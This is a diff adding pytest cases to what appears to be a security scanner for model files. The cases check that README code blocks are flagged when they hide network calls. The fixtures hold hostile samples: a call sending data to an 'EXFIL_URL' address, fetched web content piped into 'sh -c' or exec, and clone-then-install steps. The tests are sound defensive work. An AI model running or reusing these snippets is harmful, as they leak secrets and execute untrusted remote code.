@@ -705,6 +705,36 @@ fetch(os.environ["EXFIL_URL"])
     assert determine_exit_code(aggregate) == 1
 
 
+def test_text_scanner_fenced_documentation_passive_media_does_not_hide_imported_aliased_fetch(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import os
+from requests import get
+
+get("http://localhost:8080/v1/models")
+fetch = get
+fetch(os.environ["EXFIL_URL"])
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_library"
+        and check.details.get("library") == "requests"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_fenced_documentation_passive_media_does_not_hide_non_http_url(
     tmp_path: Path,
 ) -> None:
@@ -1291,6 +1321,34 @@ def test_text_scanner_fenced_documentation_github_clone_cd_then_python_m_build_r
 git clone https://github.com/example-org/model.git
 cd model
 python -m build
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_command"
+        and check.details.get("command_type") == "git_clone"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize("checkout_command", ["pip install ./model", "python -m build model"])
+def test_text_scanner_fenced_documentation_github_clone_package_manager_path_remains_actionable(
+    tmp_path: Path,
+    checkout_command: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        f"""```bash
+git clone https://github.com/example-org/model.git
+{checkout_command}
 ```
 """,
         encoding="utf-8",
@@ -2069,6 +2127,35 @@ exec(resp.text)
         and check.details.get("type") == "url_detected"
         and check.details.get("url") == "http://localhost:8080/v1/models"
         and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_passive_media_does_not_hide_indirect_subprocess_response(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import subprocess
+import requests
+
+resp = requests.get("http://images.cocodataset.org/val2017/000000039769.jpg")
+subprocess.run(["sh", "-c", resp.text])
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
         for check in result.checks
     )
     assert determine_exit_code(aggregate) == 1
